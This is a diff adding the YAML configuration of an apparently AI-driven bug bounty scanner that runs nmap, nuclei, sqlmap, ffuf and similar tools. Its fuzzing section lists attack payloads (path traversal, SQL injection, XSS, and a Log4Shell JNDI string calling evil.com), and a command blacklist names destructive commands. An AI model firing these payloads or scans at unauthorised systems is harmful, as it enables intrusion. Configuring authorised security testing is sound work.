@@ -1,0 +1,297 @@
+# ============================================================
+# BugBountyAgent - Master Configuration
+# ============================================================
+
+# --- General Settings ---
+general:
+  app_name: "BugBountyAgent"
+  version: "0.1.0"
+  debug: true
+  log_level: "INFO"  # DEBUG, INFO, WARNING, ERROR
+  data_dir: "./data"
+  logs_dir: "./logs"
+  temp_dir: "./temp"
+  max_concurrent_scans: 5
+  scan_timeout: 3600  # 1 hour default
+
+# --- AI Agent Settings ---
+agent:
+  enabled: true
+  model: "gpt-4"  # or "claude-2", "llama-2", "local"
+  api_key: "${OPENAI_API_KEY}"  # From environment variable
+  temperature: 0.7
+  max_tokens: 4096
+  learning_enabled: true
+  pattern_recognition: true
+  self_improve: true
+  confidence_threshold: 0.75
+  max_retries: 3
+  fallback_model: "gpt-3.5-turbo"
+
+  # What the agent can do
+  capabilities:
+    - "subdomain_discovery"
+    - "port_scanning"
+    - "vulnerability_scanning"
+    - "api_fuzzing"
+    - "authentication_testing"
+    - "session_analysis"
+    - "headers_check"
+    - "cors_misconfiguration"
+    - "ssl_tls_analysis"
+    - "directory_bruteforce"
+    - "parameter_fuzzing"
+    - "graphql_introspection"
+    - "logic_flow_analysis"
+
+  # What the agent CANNOT do (transparency)
+  limitations:
+    - "business_logic_errors"  # Complex logic bugs
+    - "0day_exploitation"      # Unknown vulnerabilities
+    - "physical_social_engineering"
+    - "code_review_without_context"
+
+# --- Target Management ---
+targets:
+  scope:
+    - "https://example.com"
+    - "*.example.com"
+  exclude:
+    - "*.dev.example.com"
+    - "*.staging.example.com"
+  max_depth: 3
+  follow_redirects: true
+  timeout: 30
+
+# --- Tool Configuration ---
+tools:
+  install_dir: "/opt/bugbounty-tools"
+  auto_install: true
+  update_on_start: false
+
+  nmap:
+    enabled: true
+    path: "/usr/bin/nmap"
+    args: "-sV -sC -O -T4"
+    rate_limit: 100  # packets per second
+
+  nuclei:
+    enabled: true
+    path: "/usr/local/bin/nuclei"
+    templates_dir: "/opt/nuclei-templates"
+    args: "-severity low,medium,high,critical"
+    rate_limit: 50
+
+  subfinder:
+    enabled: true
+    path: "/usr/local/bin/subfinder"
+    args: "-silent"
+    sources: "all"
+
+  amass:
+    enabled: true
+    path: "/usr/local/bin/amass"
+    args: "-passive"
+    db_dir: "./data/amass"
+
+  ffuf:
+    enabled: true
+    path: "/usr/local/bin/ffuf"
+    wordlist: "/usr/share/wordlists/dirb/common.txt"
+    threads: 40
+
+  sqlmap:
+    enabled: true
+    path: "/usr/local/bin/sqlmap"
+    args: "--batch --random-agent"
+    risk: 2
+    level: 2
+
+  nikto:
+    enabled: true
+    path: "/usr/local/bin/nikto"
+    args: "-ssl -h"
+
+  wpscan:
+    enabled: true
+    path: "/usr/local/bin/wpscan"
+    args: "--rua -e vp,vt,tt"
+
+  burp:
+    enabled: false
+    path: "/usr/local/bin/burpsuite"
+    api_port: 8080
+
+# --- Scanner Configuration ---
+scanners:
+  port_scan:
+    ports: "1-65535"
+    top_ports: "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017"
+    timeout: 2
+    retries: 1
+
+  subdomain_scan:
+    wordlist: "/usr/share/wordlists/domain_names.txt"
+    threads: 100
+    recursive: true
+    resolve: true
+
+  vuln_scan:
+    severity: ["low", "medium", "high", "critical"]
+    include_tags: ["cve", "owasp", "misconfiguration"]
+    exclude_tags: ["info", "fuzz"]
+    output_format: "json"
+    max_results: 100
+
+  api_fuzzing:
+    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"]
+    headers: ["X-Forwarded-For", "X-Originating-IP", "X-Remote-IP"]
+    parameters:
+      - "id"
+      - "user_id"
+      - "admin"
+      - "debug"
+      - "test"
+    payloads: ["../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>", "${jndi:ldap://evil.com}"]
+
+# --- Authentication ---
+auth:
+  methods:
+    - "basic"
+    - "bearer"
+    - "oauth2"
+    - "jwt"
+    - "api_key"
+  session_handling:
+    cookie_jar: true
+    auto_login: false
+    login_url: ""
+    credentials: ""
+
+# --- Learning Engine ---
+learning:
+  enabled: true
+  knowledge_base: "./data/knowledge.db"
+  patterns_dir: "./data/patterns"
+  learn_from: ["past_scans", "public_bug_reports", "cve_database", "community_feed"]
+  update_interval: 3600  # 1 hour
+  max_patterns: 10000
+
+# --- Dashboard Settings ---
+dashboard:
+  enabled: true
+  host: "0.0.0.0"
+  port: 5000
+  debug: true
+  secret_key: "${DASHBOARD_SECRET_KEY}"
+  theme: "dark"  # dark, light
+  refresh_interval: 5  # seconds
+  pagination: 50
+  realtime: true
+
+  # Features
+  features:
+    - "target_management"
+    - "scan_control"
+    - "results_viewer"
+    - "reports_generation"
+    - "statistics"
+    - "logs_viewer"
+    - "settings_editor"
+    - "agent_console"
+
+# --- Reporting ---
+reports:
+  format: ["html", "pdf", "json", "markdown"]
+  save_dir: "./data/reports"
+  auto_generate: true
+  include:
+    - "summary"
+    - "vulnerabilities"
+    - "reproduction_steps"
+    - "recommendations"
+    - "severity_matrix"
+    - "tool_output"
+  template: "default"
+
+# --- Notifications ---
+notifications:
+  enabled: true
+  methods:
+    - "console"
+    - "email"
+    - "telegram"
+    - "webhook"
+  email:
+    smtp_server: "smtp.gmail.com"
+    smtp_port: 587
+    from: "alerts@bugbountyagent.com"
+    to: "user@example.com"
+  telegram:
+    bot_token: "${TELEGRAM_BOT_TOKEN}"
+    chat_id: "${TELEGRAM_CHAT_ID}"
+  webhook:
+    url: "${WEBHOOK_URL}"
+    headers: {"Content-Type": "application/json"}
+
+# --- Database ---
+database:
+  type: "sqlite"  # sqlite, postgresql, mysql
+  sqlite:
+    path: "./data/bugbounty.db"
+  postgresql:
+    host: "localhost"
+    port: 5432
+    database: "bugbounty"
+    username: "bugbounty"
+    password: "${DB_PASSWORD}"
+  mysql:
+    host: "localhost"
+    port: 3306
+    database: "bugbounty"
+    username: "bugbounty"
+    password: "${DB_PASSWORD}"
+
+# --- API Integrations ---
+integrations:
+  bugcrowd:
+    enabled: false
+    api_key: "${BUGCROWD_API_KEY}"
+    api_url: "https://api.bugcrowd.com"
+  hackerone:
+    enabled: false
+    api_key: "${HACKERONE_API_KEY}"
+    api_url: "https://api.hackerone.com/v1"
+  slack:
+    enabled: false
+    webhook_url: "${SLACK_WEBHOOK_URL}"
+
+# --- Security ---
+security:
+  allowed_ips: []
+  rate_limit: 100
+  max_requests: 1000
+  log_all_commands: true
+  command_whitelist:
+    - "nmap"
+    - "nuclei"
+    - "subfinder"
+    - "amass"
+    - "ffuf"
+    - "sqlmap"
+    - "nikto"
+    - "wpscan"
+  command_blacklist:
+    - "rm -rf"
+    - "dd"
+    - "mkfs"
+    - "shutdown"
+
+# --- System ---
+system:
+  temp_dir: "/tmp/bugbounty"
+  max_file_size: 104857600  # 100MB
+  max_threads: 8
+  memory_limit: 4096  # MB
+  cpu_limit: 80  # Percent
+  network_interface: "eth0"
